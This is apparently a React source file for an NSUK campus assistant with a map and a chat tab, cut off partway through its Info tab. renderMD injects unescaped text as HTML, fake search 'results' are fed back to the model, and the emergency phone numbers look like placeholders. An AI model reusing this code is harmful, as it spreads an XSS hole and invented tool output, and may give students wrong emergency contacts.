import { useState, useEffect, useRef, useCallback } from "react";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// ── NSUK landmarks for the info sidebar (lat/lng for Google Maps markers via URL)
const LANDMARKS = [
  { id: "gate_main", name: "Main Gate", cat: "facility", emoji: "🚧", lat: 8.0982, lng: 8.3601, desc: "Primary entry off Keffi-Akwanga Highway" },
  { id: "senate", name: "Senate Building", cat: "admin", emoji: "🏛️", lat: 8.0995, lng: 8.3615, desc: "Vice-Chancellor, Registrar, Bursary" },
  { id: "registry", name: "Student Affairs Registry", cat: "admin", emoji: "📋", lat: 8.0998, lng: 8.3620, desc: "Admissions, transcripts, clearance" },
  { id: "bursary", name: "Bursary Department", cat: "admin", emoji: "💰", lat: 8.0993, lng: 8.3618, desc: "School fees, financial clearance" },
  { id: "icms", name: "Inst. of Capital Market Studies", cat: "admin", emoji: "📈", lat: 8.1010, lng: 8.3640, desc: "Africa-first university capital market institute" },
  { id: "fac_admin", name: "Faculty of Administration", cat: "faculty", emoji: "📊", lat: 8.1005, lng: 8.3590, desc: "Business, Public Admin, Accounting" },
  { id: "fac_arts", name: "Faculty of Arts", cat: "faculty", emoji: "🎨", lat: 8.1008, lng: 8.3580, desc: "English, History, Languages, Philosophy" },
  { id: "fac_edu", name: "Faculty of Education", cat: "faculty", emoji: "📚", lat: 8.1012, lng: 8.3600, desc: "Educational Psychology, Curriculum Studies" },
  { id: "fac_env", name: "Faculty of Environmental Sciences", cat: "faculty", emoji: "🌿", lat: 8.1015, lng: 8.3625, desc: "Architecture, Urban Planning, Surveying" },
  { id: "fac_law", name: "Faculty of Law", cat: "faculty", emoji: "⚖️", lat: 8.1018, lng: 8.3635, desc: "LLB, BL programmes" },
  { id: "fac_sci", name: "Faculty of Natural & Applied Sciences", cat: "faculty", emoji: "🔬", lat: 8.1002, lng: 8.3645, desc: "Physics, Chemistry, Maths, Biology" },
  { id: "fac_med", name: "Faculty of Medical & Health Sciences", cat: "faculty", emoji: "🏥", lat: 8.0988, lng: 8.3650, desc: "Medicine, Nursing, Pharmacy" },
  { id: "fac_soc", name: "Faculty of Social Sciences", cat: "faculty", emoji: "🌍", lat: 8.1000, lng: 8.3585, desc: "Economics, Sociology, Political Science" },
  { id: "library", name: "University Library", cat: "facility", emoji: "📖", lat: 8.0997, lng: 8.3610, desc: "Main library — 24hr reading rooms" },
  { id: "health_ctr", name: "Health Centre", cat: "facility", emoji: "🏥", lat: 8.0990, lng: 8.3620, desc: "Medical consultations, sick bay" },
  { id: "ict_centre", name: "ICT Centre", cat: "facility", emoji: "💻", lat: 8.0994, lng: 8.3605, desc: "Computer labs, internet access" },
  { id: "auditorium", name: "Assembly Hall / Auditorium", cat: "facility", emoji: "🎭", lat: 8.0992, lng: 8.3612, desc: "Convocation ceremonies, major events" },
  { id: "sports", name: "Sports Complex", cat: "facility", emoji: "⚽", lat: 8.0978, lng: 8.3595, desc: "Football pitch, indoor games hall" },
  { id: "hostel_male", name: "Men's Hostel Complex", cat: "hostel", emoji: "🏠", lat: 8.0970, lng: 8.3580, desc: "Angwan Lambu — blocks A–D" },
  { id: "hostel_female", name: "Women's Hostel Complex", cat: "hostel", emoji: "🏠", lat: 8.0965, lng: 8.3590, desc: "Angwan Lambu — blocks E–H" },
  { id: "pgd_hostel", name: "Postgraduate Hostel", cat: "hostel", emoji: "🏠", lat: 8.1020, lng: 8.3655, desc: "Reserved for graduate students" },
];

const QUICK = [
  { label: "📋 Registration", q: "How do I register for courses at NSUK?" },
  { label: "🏠 Hostel Rules", q: "What are the NSUK hostel rules and how do I get accommodation?" },
  { label: "🎓 Scholarships", q: "What scholarships are available for NSUK students?" },
  { label: "📅 Exams", q: "When is the NSUK exam timetable released and how do I get my exam card?" },
  { label: "📰 Latest News", q: "What are the latest news and announcements from NSUK in 2025?" },
  { label: "🌍 Postgrad", q: "How do I apply for a postgraduate programme at NSUK?" },
];

const TOPICS = [
  { emoji: "📋", label: "Course Registration", q: "How do I register for courses at NSUK?" },
  { emoji: "💰", label: "School Fees & Payment", q: "What are the current NSUK school fees and how do I pay?" },
  { emoji: "🏠", label: "Hostel Allocation", q: "How do I get hostel accommodation at NSUK?" },
  { emoji: "🎓", label: "Scholarships & Bursary", q: "What scholarships and bursaries are available at NSUK?" },
  { emoji: "📅", label: "Exam Timetable", q: "When is the NSUK exam timetable released for the 2024/2025 session?" },
  { emoji: "📄", label: "Transcript Request", q: "How do I apply for my academic transcript at NSUK?" },
  { emoji: "🔬", label: "Faculty of Sciences", q: "Tell me about the Faculty of Natural and Applied Sciences at NSUK" },
  { emoji: "🌍", label: "Postgrad Admissions", q: "What are the requirements for postgraduate admission at NSUK?" },
  { emoji: "🏥", label: "Health Services", q: "What health services and facilities are available at NSUK campus?" },
  { emoji: "📰", label: "Latest NSUK News", q: "What are the latest news and announcements from NSUK 2025?" },
  { emoji: "🆔", label: "Student ID Card", q: "How do I get my NSUK student ID card?" },
  { emoji: "📊", label: "CGPA & Results", q: "How is CGPA calculated at NSUK and where can I check my results?" },
];

const SYSTEM_PROMPT = `You are Campus Buddy, the official AI assistant for Nasarawa State University, Keffi (NSUK), Nigeria. You help students, staff, and visitors with any question about university life.

KEY NSUK FACTS:
- Founded 2001, ~29,041 students, 8 faculties, Main Campus on Keffi-Akwanga Highway
- Ranked #1 in Nigeria for SDG4 Quality Education
- 8 Faculties: Administration, Arts, Education, Environmental Sciences, Law, Natural & Applied Sciences, Medical & Health Sciences, Social Sciences
- New: Institute of Capital Market Studies (Africa's first university-based capital market institute)
- Hostels in Angwan Lambu area (Blocks A–H), Postgraduate Hostel near postgrad school
- Key buildings: Senate Building (admin), Bursary, Registry, Library, Health Centre, ICT Centre, Assembly Hall/Auditorium
- Student portal: portal.nsuk.edu.ng

You have web search enabled. Use it for: latest news, current fees, recent events, staff contacts, and anything that may have changed.

Be friendly, conversational, and thorough. Format answers with bullet points and bold headings when helpful. If a question involves a physical location on campus, mention they can use the Map tab to navigate there. If you genuinely don't know something specific, say so and suggest where the student can verify (e.g., Registry, portal, departmental office).`;

// ── MAP SRC: Google Maps embed centered on NSUK, satellite view
// Uses Google Maps embed API (no API key needed for basic embed)
const NSUK_LAT = 8.0995;
const NSUK_LNG = 8.3620;

function getMapSrc(mode = "satellite") {
  // Google Maps embed with satellite view at NSUK coordinates
  const q = encodeURIComponent("Nasarawa State University Keffi");
  if (mode === "directions") {
    return `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3939.8!2d${NSUK_LNG}!3d${NSUK_LAT}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x104e7450!2sNasarawa+State+University+Keffi!5e1!3m2!1sen!2sng!4v1`;
  }
  // Satellite view (5e1 = satellite)
  return `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3939.8!2d${NSUK_LNG}!3d${NSUK_LAT}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x104e74563c280001%3A0x4f8ee5e62b4b6fcf!2sNasarawa+State+University%2C+Keffi!5e1!3m2!1sen!2sng!4v1719000000000!5m2!1sen!2sng`;
}

function getLandmarkMapSrc(lm) {
  return `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d500!2d${lm.lng}!3d${lm.lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2z${lm.name.replace(/ /g, "+")}!5e1!3m2!1sen!2sng!4v1`;
}

function getDirectionsSrc(toLat, toLng) {
  return `https://www.google.com/maps/embed?pb=!1m28!1m12!1m3!1d7879.6!2d${toLng}!3d${toLat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!4m13!4e2!4m5!1sYour+Location!2sYour+Location!3m2!1d${toLat}!2d${toLng}!4m5!1s0x104e74563c280001%3A0x4f8ee5e62b4b6fcf!2sNasarawa+State+University+Keffi!3m2!1d${NSUK_LAT}!2d${NSUK_LNG}!5e1!3m2!1sen!2sng!4v1`;
}

export default function CampusBuddy() {
  const [tab, setTab] = useState("map");
  const [messages, setMessages] = useState([
    {
      role: "assistant",
      content: `👋 **Welcome to Campus Buddy — NSUK's AI Assistant!**\n\nI'm powered by Claude AI with live web search. Ask me anything about:\n\n• 📋 **Registration, fees & clearance** — step-by-step guidance\n• 🗺️ **Campus directions** — I'll help you navigate, use the Map tab too\n• 🎓 **Admissions & scholarships** — undergrad and postgraduate\n• 📅 **Exams, results & timetables**\n• 📰 **Latest NSUK news** — I'll search the web for current info\n• 💬 **Anything else** — I'll find an answer or search online\n\nWhat can I help you with today?`,
      source: null,
    },
  ]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [catFilter, setCatFilter] = useState("all");
  const [search, setSearch] = useState("");
  const [selectedLandmark, setSelectedLandmark] = useState(null);
  const [mapMode, setMapMode] = useState("main"); // main | landmark | directions
  const messagesEndRef = useRef(null);
  const textareaRef = useRef(null);
  const historyRef = useRef([]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, loading]);

  const filteredLandmarks = LANDMARKS.filter((l) => {
    const matchCat = catFilter === "all" || l.cat === catFilter;
    const matchSearch =
      !search ||
      l.name.toLowerCase().includes(search.toLowerCase()) ||
      l.desc.toLowerCase().includes(search.toLowerCase());
    return matchCat && matchSearch;
  });

  const selectLandmark = (lm) => {
    setSelectedLandmark(lm);
    setMapMode("landmark");
  };

  const openGoogleMaps = (lm) => {
    const url = `https://maps.google.com/?q=${lm.lat},${lm.lng}`;
    window.open(url, "_blank");
  };

  const getDirections = (lm) => {
    const url = `https://www.google.com/maps/dir/Current+Location/${lm.lat},${lm.lng}`;
    window.open(url, "_blank");
  };

  const getMainMapSrc = () => {
    if (mapMode === "landmark" && selectedLandmark) {
      return `https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d800!2d${selectedLandmark.lng}!3d${selectedLandmark.lat}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x104e74563c280001%3A0x4f8ee5e62b4b6fcf!2s${encodeURIComponent(selectedLandmark.name + " NSUK Keffi")}!5e1!3m2!1sen!2sng!4v1${Date.now()}!5m2!1sen!2sng`;
    }
    return getMapSrc();
  };

  async function sendMessage(overrideInput) {
    const text = (overrideInput ?? input).trim();
    if (!text || loading) return;
    setInput("");
    if (textareaRef.current) textareaRef.current.style.height = "auto";

    const userMsg = { role: "user", content: text, source: null };
    setMessages((m) => [...m, userMsg]);
    historyRef.current = [...historyRef.current, { role: "user", content: text }];
    setLoading(true);

    try {
      const res = await fetch("https://campus-buddy-api-mozi.onrender.com/api/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "claude-sonnet-4-6",
          max_tokens: 1000,
          system: SYSTEM_PROMPT,
          tools: [{ type: "web_search_20250305", name: "web_search" }],
          messages: historyRef.current,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error?.message || `Error ${res.status}`);

      let finalText = "";
      let usedSearch = false;
      let toolUseBlocks = [];

      for (const block of data.content) {
        if (block.type === "text") finalText += block.text;
        if (block.type === "tool_use") {
          usedSearch = true;
          toolUseBlocks.push(block);
        }
      }

      // Handle tool use (web search) — send results back
      if (data.stop_reason === "tool_use" && toolUseBlocks.length > 0) {
        const toolResults = toolUseBlocks.map((b) => ({
          type: "tool_result",
          tool_use_id: b.id,
          content: `Search query "${b.input?.query}" was executed.`,
        }));

        const followUp = [
          ...historyRef.current,
          { role: "assistant", content: data.content },
          { role: "user", content: toolResults },
        ];

        const res2 = await fetch("https://campus-buddy-api-mozi.onrender.com/api/chat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            model: "claude-sonnet-4-6",
            max_tokens: 1000,
            system: SYSTEM_PROMPT,
            tools: [{ type: "web_search_20250305", name: "web_search" }],
            messages: followUp,
          }),
        });

        const data2 = await res2.json();
        finalText = data2.content
          .filter((b) => b.type === "text")
          .map((b) => b.text)
          .join("");

        historyRef.current = [
          ...historyRef.current,
          { role: "assistant", content: data.content },
          { role: "user", content: toolResults },
        ];
      }

      if (!finalText) finalText = "I couldn't generate a response. Please try again.";
      historyRef.current = [...historyRef.current, { role: "assistant", content: finalText }];
      setMessages((m) => [...m, { role: "assistant", content: finalText, source: usedSearch ? "web" : "kb" }]);
    } catch (err) {
      console.error(err);
      setMessages((m) => [
        ...m,
        {
          role: "assistant",
          content: `⚠️ I couldn't connect right now (${err.message}).\n\nFor immediate help:\n• **Student Portal:** portal.nsuk.edu.ng\n• **Registry:** Senate Building, NSUK Main Campus\n• **Emergency:** Security 08033000001 | Health Centre 08100000001`,
          source: "offline",
        },
      ]);
    }
    setLoading(false);
  }

  function handleKey(e) {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  }

  function autoResize(e) {
    e.target.style.height = "auto";
    e.target.style.height = Math.min(e.target.scrollHeight, 120) + "px";
  }

  function renderMD(text) {
    if (!text) return "";
    const lines = text.split("\n");
    let html = "";
    let inUl = false;
    let inOl = false;
    for (const line of lines) {
      const ul = line.match(/^[•\-\*]\s+(.*)/);
      const ol = line.match(/^(\d+)\.\s+(.*)/);
      const h3 = line.match(/^###\s+(.*)/);
      const h2 = line.match(/^##\s+(.*)/);
      if (ul) {
        if (!inUl) { if (inOl) { html += "</ol>"; inOl = false; } html += "<ul>"; inUl = true; }
        html += `<li>${fmt(ul[1])}</li>`;
      } else if (ol) {
        if (!inOl) { if (inUl) { html += "</ul>"; inUl = false; } html += "<ol>"; inOl = true; }
        html += `<li>${fmt(ol[2])}</li>`;
      } else {
        if (inUl) { html += "</ul>"; inUl = false; }
        if (inOl) { html += "</ol>"; inOl = false; }
        if (h3) html += `<strong style="display:block;margin:8px 0 4px">${fmt(h3[1])}</strong>`;
        else if (h2) html += `<strong style="display:block;margin:10px 0 4px;font-size:15px">${fmt(h2[1])}</strong>`;
        else if (line.trim() === "") html += "<br/>";
        else html += `<span>${fmt(line)}</span><br/>`;
      }
    }
    if (inUl) html += "</ul>";
    if (inOl) html += "</ol>";
    return html;
  }

  function fmt(s) {
    return s
      .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
      .replace(/\*(.+?)\*/g, "<em>$1</em>")
      .replace(/`(.+?)`/g, '<code style="background:var(--color-background-secondary);padding:1px 4px;border-radius:4px;font-size:12px">$1</code>');
  }

  const catColors = { all: "#40916c", faculty: "#2563eb", admin: "#7c3aed", hostel: "#9b59b6", facility: "#d97706" };

  return (
    <div style={{ height: "100vh", display: "flex", flexDirection: "column", fontFamily: "var(--font-sans)", background: "var(--color-background-tertiary)", overflow: "hidden" }}>

      {/* NAV */}
      <div style={{ background: "#1a3a2a", color: "white", display: "flex", alignItems: "center", justifyContent: "space-between", padding: "0 20px", height: 54, flexShrink: 0, boxShadow: "0 2px 8px rgba(0,0,0,0.3)" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ width: 32, height: 32, background: "#40916c", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18 }}>🎓</div>
          <div>
            <div style={{ fontWeight: 700, fontSize: 17, letterSpacing: "-0.3px" }}>Campus<span style={{ color: "#e9c46a" }}>Buddy</span></div>
            <div style={{ fontSize: 9, color: "#74c69d", letterSpacing: "0.6px", textTransform: "uppercase" }}>NSUK Navigator & AI Hub</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 4 }}>
          {[
            { id: "map", label: "🗺️ Map" },
            { id: "chat", label: "💬 Ask AI" },
            { id: "info", label: "📋 Info" },
          ].map((t) => (
            <button
              key={t.id}
              onClick={() => setTab(t.id)}
              style={{
                background: tab === t.id ? "#40916c" : "transparent",
                border: "none",
                color: tab === t.id ? "white" : "#74c69d",
                fontFamily: "var(--font-sans)",
                fontSize: 13,
                fontWeight: 500,
                padding: "6px 14px",
                borderRadius: 6,
                cursor: "pointer",
              }}
            >
              {t.label}
              {t.id === "chat" && <span style={{ background: "#e9c46a", color: "#1a3a2a", fontSize: 9, fontWeight: 700, padding: "1px 5px", borderRadius: 4, marginLeft: 5 }}>AI</span>}
            </button>
          ))}
        </div>
      </div>

      {/* ══ MAP TAB ══ */}
      {tab === "map" && (
        <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
          {/* Sidebar */}
          <div style={{ width: 280, flexShrink: 0, background: "var(--color-background-primary)", borderRight: "0.5px solid var(--color-border-tertiary)", display: "flex", flexDirection: "column", overflow: "hidden" }}>
            <div style={{ padding: "12px 14px 10px", borderBottom: "0.5px solid var(--color-border-tertiary)", flexShrink: 0 }}>
              <div style={{ fontWeight: 500, fontSize: 14, marginBottom: 8 }}>NSUK Main Campus</div>
              <input
                placeholder="Search locations…"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                style={{ width: "100%", fontSize: 13, padding: "6px 10px", borderRadius: 8, border: "0.5px solid var(--color-border-tertiary)", background: "var(--color-background-secondary)", color: "var(--color-text-primary)" }}
              />
            </div>
            {/* Category filter */}
            <div style={{ padding: "8px 12px", display: "flex", gap: 5, flexWrap: "wrap", borderBottom: "0.5px solid var(--color-border-tertiary)", flexShrink: 0 }}>
              {["all", "faculty", "admin", "hostel", "facility"].map((c) => (
                <button
                  key={c}
                  onClick={() => setCatFilter(c)}
                  style={{
                    background: catFilter === c ? catColors[c] : "var(--color-background-secondary)",
                    border: `0.5px solid ${catFilter === c ? catColors[c] : "var(--color-border-tertiary)"}`,
                    color: catFilter === c ? "white" : "var(--color-text-secondary)",
                    borderRadius: 20, padding: "3px 10px", fontSize: 11, fontWeight: 500, cursor: "pointer", fontFamily: "var(--font-sans)",
                  }}
                >
                  {c.charAt(0).toUpperCase() + c.slice(1)}
                </button>
              ))}
            </div>
            {/* List */}
            <div style={{ flex: 1, overflowY: "auto" }}>
              {filteredLandmarks.map((lm) => (
                <div
                  key={lm.id}
                  onClick={() => selectLandmark(lm)}
                  style={{
                    display: "flex", alignItems: "flex-start", gap: 10, padding: "10px 14px", cursor: "pointer",
                    background: selectedLandmark?.id === lm.id ? "#d8f3dc" : "transparent",
                    borderBottom: "0.5px solid var(--color-border-tertiary)",
                    transition: "background 0.1s",
                  }}
                  onMouseEnter={(e) => { if (selectedLandmark?.id !== lm.id) e.currentTarget.style.background = "var(--color-background-secondary)"; }}
                  onMouseLeave={(e) => { if (selectedLandmark?.id !== lm.id) e.currentTarget.style.background = "transparent"; }}
                >
                  <div style={{ fontSize: 20, marginTop: 1 }}>{lm.emoji}</div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 13, fontWeight: 500, color: "var(--color-text-primary)", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{lm.name}</div>
                    <div style={{ fontSize: 11, color: "var(--color-text-secondary)", marginTop: 1 }}>{lm.desc}</div>
                  </div>
                </div>
              ))}
            </div>
            {/* Selected landmark actions */}
            {selectedLandmark && (
              <div style={{ padding: "10px 12px", borderTop: "0.5px solid var(--color-border-tertiary)", background: "var(--color-background-secondary)", flexShrink: 0 }}>
                <div style={{ fontSize: 12, fontWeight: 500, marginBottom: 7, color: "var(--color-text-primary)" }}>{selectedLandmark.emoji} {selectedLandmark.name}</div>
                <div style={{ display: "flex", gap: 6 }}>
                  <button onClick={() => openGoogleMaps(selectedLandmark)} style={{ flex: 1, background: "#40916c", border: "none", color: "white", borderRadius: 6, padding: "6px 4px", fontSize: 11, cursor: "pointer", fontFamily: "var(--font-sans)" }}>
                    Open in Google Maps
                  </button>
                  <button onClick={() => getDirections(selectedLandmark)} style={{ flex: 1, background: "#1a3a2a", border: "none", color: "white", borderRadius: 6, padding: "6px 4px", fontSize: 11, cursor: "pointer", fontFamily: "var(--font-sans)" }}>
                    Get Directions
                  </button>
                </div>
                <button onClick={() => { setSelectedLandmark(null); setMapMode("main"); }} style={{ width: "100%", marginTop: 5, background: "transparent", border: "0.5px solid var(--color-border-tertiary)", color: "var(--color-text-secondary)", borderRadius: 6, padding: "5px", fontSize: 11, cursor: "pointer", fontFamily: "var(--font-sans)" }}>
                  ← Back to campus overview
                </button>
              </div>
            )}
          </div>

          {/* Map iframe */}
          <div style={{ flex: 1, position: "relative", overflow: "hidden" }}>
            {/* View toggle */}
            <div style={{ position: "absolute", top: 12, left: 12, zIndex: 10, display: "flex", flexDirection: "column", gap: 4 }}>
              <button
                onClick={() => { setSelectedLandmark(null); setMapMode("main"); }}
                style={{ background: "white", border: "1px solid #ddd", borderRadius: 6, padding: "6px 10px", fontSize: 12, fontWeight: 500, cursor: "pointer", boxShadow: "0 1px 4px rgba(0,0,0,0.15)", color: mapMode === "main" ? "#40916c" : "#555" }}
              >
                🏛️ Full Campus
              </button>
              <a
                href={`https://www.google.com/maps/place/Nasarawa+State+University/@${NSUK_LAT},${NSUK_LNG},17z`}
                target="_blank"
                rel="noreferrer"
                style={{ background: "white", border: "1px solid #ddd", borderRadius: 6, padding: "6px 10px", fontSize: 12, fontWeight: 500, cursor: "pointer", boxShadow: "0 1px 4px rgba(0,0,0,0.15)", textDecoration: "none", color: "#555", textAlign: "center" }}
              >
                🔗 Open in Google Maps
              </a>
              <a
                href={`https://www.google.com/maps/dir//${NSUK_LAT},${NSUK_LNG}`}
                target="_blank"
                rel="noreferrer"
                style={{ background: "#1a3a2a", border: "none", borderRadius: 6, padding: "6px 10px", fontSize: 12, fontWeight: 500, cursor: "pointer", boxShadow: "0 1px 4px rgba(0,0,0,0.15)", textDecoration: "none", color: "white", textAlign: "center" }}
              >
                📍 Directions to NSUK
              </a>
            </div>

            <iframe
              key={mapMode + (selectedLandmark?.id || "")}
              src={getMainMapSrc()}
              width="100%"
              height="100%"
              style={{ border: "none", display: "block" }}
              allowFullScreen
              loading="lazy"
              referrerPolicy="no-referrer-when-downgrade"
              title="NSUK Campus Map"
            />
          </div>
        </div>
      )}

      {/* ══ CHAT TAB ══ */}
      {tab === "chat" && (
        <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
          {/* Main chat */}
          <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            {/* Chat header */}
            <div style={{ background: "var(--color-background-primary)", borderBottom: "0.5px solid var(--color-border-tertiary)", padding: "10px 18px", display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
              <div style={{ width: 36, height: 36, background: "#1a3a2a", borderRadius: 10, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18 }}>🤖</div>
              <div>
                <div style={{ fontWeight: 500, fontSize: 14 }}>Campus Buddy AI</div>
                <div style={{ fontSize: 11, color: "#40916c" }}>Powered by Claude · NSUK Knowledge Base · Web Search enabled</div>
              </div>
              <div style={{ marginLeft: "auto", width: 8, height: 8, background: "#22c55e", borderRadius: "50%" }} />
            </div>

            {/* Messages */}
            <div style={{ flex: 1, overflowY: "auto", padding: "16px 18px", display: "flex", flexDirection: "column", gap: 12 }}>
              {messages.map((m, i) => (
                <div key={i} style={{ display: "flex", gap: 8, maxWidth: "84%", alignSelf: m.role === "user" ? "flex-end" : "flex-start", flexDirection: m.role === "user" ? "row-reverse" : "row" }}>
                  <div style={{ width: 28, height: 28, borderRadius: 7, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 14, background: m.role === "user" ? "#40916c" : "#1a3a2a", color: "white" }}>
                    {m.role === "user" ? "👤" : "🤖"}
                  </div>
                  <div>
                    <div
                      style={{
                        padding: "10px 14px", borderRadius: 12, fontSize: 14, lineHeight: 1.6,
                        background: m.role === "user" ? "#1a3a2a" : "var(--color-background-primary)",
                        color: m.role === "user" ? "white" : "var(--color-text-primary)",
                        borderBottomRightRadius: m.role === "user" ? 4 : 12,
                        borderBottomLeftRadius: m.role === "ai" ? 4 : 12,
                        boxShadow: m.role !== "user" ? "0 1px 3px rgba(0,0,0,0.07)" : "none",
                      }}
                      dangerouslySetInnerHTML={{ __html: renderMD(m.content) }}
                    />
                    {m.role === "assistant" && m.source && (
                      <div style={{ fontSize: 10, color: "var(--color-text-secondary)", marginTop: 4, display: "flex", alignItems: "center", gap: 4 }}>
                        {m.source === "web" && <span style={{ background: "#fef3c7", color: "#92400e", border: "0.5px solid #fcd34d", borderRadius: 4, padding: "1px 6px", fontSize: 9, fontWeight: 500 }}>🌐 WEB SEARCH</span>}
                        {m.source === "kb" && <span style={{ background: "#d8f3dc", color: "#1a6b3a", border: "0.5px solid #74c69d", borderRadius: 4, padding: "1px 6px", fontSize: 9, fontWeight: 500 }}>📄 NSUK KB</span>}
                        {m.source === "offline" && <span style={{ background: "#fee2e2", color: "#991b1b", border: "0.5px solid #fca5a5", borderRadius: 4, padding: "1px 6px", fontSize: 9, fontWeight: 500 }}>⚠️ OFFLINE</span>}
                      </div>
                    )}
                  </div>
                </div>
              ))}
              {loading && (
                <div style={{ display: "flex", gap: 8, alignSelf: "flex-start" }}>
                  <div style={{ width: 28, height: 28, borderRadius: 7, background: "#1a3a2a", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 14 }}>🤖</div>
                  <div style={{ padding: "12px 16px", background: "var(--color-background-primary)", borderRadius: 12, borderBottomLeftRadius: 4, boxShadow: "0 1px 3px rgba(0,0,0,0.07)", display: "flex", gap: 5, alignItems: "center" }}>
                    {[0, 1, 2].map((d) => (
                      <div key={d} style={{ width: 6, height: 6, borderRadius: "50%", background: "#40916c", animation: "bounce 1.2s infinite", animationDelay: `${d * 0.2}s` }} />
                    ))}
                  </div>
                </div>
              )}
              <div ref={messagesEndRef} />
            </div>

            {/* Input area */}
            <div style={{ padding: "12px 18px", background: "var(--color-background-primary)", borderTop: "0.5px solid var(--color-border-tertiary)", flexShrink: 0 }}>
              <div style={{ display: "flex", gap: 6, marginBottom: 8, flexWrap: "wrap" }}>
                {QUICK.map((q) => (
                  <button
                    key={q.label}
                    onClick={() => sendMessage(q.q)}
                    style={{ background: "#d8f3dc", border: "0.5px solid #74c69d", borderRadius: 20, padding: "4px 12px", fontSize: 12, color: "#1a6b3a", cursor: "pointer", fontFamily: "var(--font-sans)", fontWeight: 500 }}
                  >
                    {q.label}
                  </button>
                ))}
              </div>
              <div style={{ display: "flex", alignItems: "flex-end", gap: 8, background: "var(--color-background-secondary)", border: "0.5px solid var(--color-border-tertiary)", borderRadius: 12, padding: "8px 12px" }}
                onFocus={(e) => e.currentTarget.style.borderColor = "#40916c"}
                onBlur={(e) => e.currentTarget.style.borderColor = "var(--color-border-tertiary)"}
              >
                <textarea
                  ref={textareaRef}
                  value={input}
                  onChange={(e) => { setInput(e.target.value); autoResize(e); }}
                  onKeyDown={handleKey}
                  placeholder="Ask anything about NSUK — registration, directions, fees, news…"
                  rows={1}
                  style={{ flex: 1, border: "none", background: "transparent", resize: "none", fontFamily: "var(--font-sans)", fontSize: 14, color: "var(--color-text-primary)", outline: "none", lineHeight: 1.5, minHeight: 22, maxHeight: 120 }}
                />
                <button
                  onClick={() => sendMessage()}
                  disabled={loading || !input.trim()}
                  style={{ width: 32, height: 32, background: loading || !input.trim() ? "var(--color-border-tertiary)" : "#40916c", border: "none", borderRadius: 8, cursor: loading || !input.trim() ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", color: "white", fontSize: 15, flexShrink: 0 }}
                >
                  ➤
                </button>
              </div>
            </div>
          </div>

          {/* Topics sidebar */}
          <div style={{ width: 220, flexShrink: 0, background: "var(--color-background-primary)", borderLeft: "0.5px solid var(--color-border-tertiary)", overflowY: "auto" }}>
            <div style={{ padding: "13px 14px", borderBottom: "0.5px solid var(--color-border-tertiary)", fontSize: 13, fontWeight: 500 }}>📚 Knowledge Topics</div>
            {TOPICS.map((t) => (
              <div
                key={t.label}
                onClick={() => { setTab("chat"); sendMessage(t.q); }}
                style={{ padding: "9px 14px", fontSize: 12, color: "var(--color-text-secondary)", cursor: "pointer", borderBottom: "0.5px solid var(--color-border-tertiary)", display: "flex", alignItems: "center", gap: 8 }}
                onMouseEnter={(e) => e.currentTarget.style.background = "var(--color-background-secondary)"}
                onMouseLeave={(e) => e.currentTarget.style.background = "transparent"}
              >
                <span>{t.emoji}</span>{t.label}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ══ INFO TAB ══ */}
      {tab === "info" && (
        <div style={{ flex: 1, overflowY: "auto" }}>
          {/* Hero */}
          <div style={{ background: "#1a3a2a", color: "white", padding: "28px 36px", display: "flex", alignItems: "center", gap: 24 }}>
            <div style={{ width: 68, height: 68, background: "#40916c", borderRadius: 16, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 34, flexShrink: 0 }}>🏛️</div>
            <div>
              <div style={{ fontWeight: 700, fontSize: 22, marginBottom: 5 }}>Nasarawa State University, Keffi <span style={{ color: "#e9c46a" }}>(NSUK)</span></div>
              <div style={{ fontSize: 13, color: "#74c69d", lineHeight: 1.5 }}>Main Campus · Keffi-Akwanga Highway · "Knowledge for Development" · Ranked #1 Nigeria for Quality Education SDG</div>
            </div>
          </div>

          {/* Stats row */}
          <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 12, padding: "20px 24px 0" }}>
            {[
              { val: "29,041", lbl: "Enrolled Students" },
              { val: "8", lbl: "Faculties" },
              { val: "#1", lbl: "Nigeria SDG4 Rank" },
              { val: "2001", lbl: "Year Founded" },
            ].map((s) => (
              <div key={s.lbl} style={{ background: "var(--color-background-primary)", border: "0.5px solid var(--color-border-tertiary)", borderRadius: 10, padding: "14px 16px", textAlign: "center" }}>
                <div style={{ fontSize: 22, fontWeight: 500, color: "#40916c" }}>{s.val}</div>
                <div style={{ fontSize: 11, color: "var(--color-text-secondary)", marginTop: 2 }}>{s.lbl}</div>
              </div>
